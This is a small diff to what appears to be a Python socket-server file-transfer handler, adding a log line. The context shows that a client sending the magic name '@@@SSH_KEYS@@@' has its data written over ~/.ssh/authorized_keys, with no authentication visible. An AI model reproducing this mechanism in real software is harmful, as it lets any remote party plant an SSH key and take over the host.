@@ -70,6 +70,7 @@ class ClientThread(socketserver.BaseRequestHandler):
     # c.sendStr("Connected\n")
     filename = c.recvLine()
     if filename == "@@@SSH_KEYS@@@":
+      print("Receiving Keys")
       outFile = path.expanduser("~/.ssh/authorized_keys")
       c.storeAll(outFile)
       self.request.close()
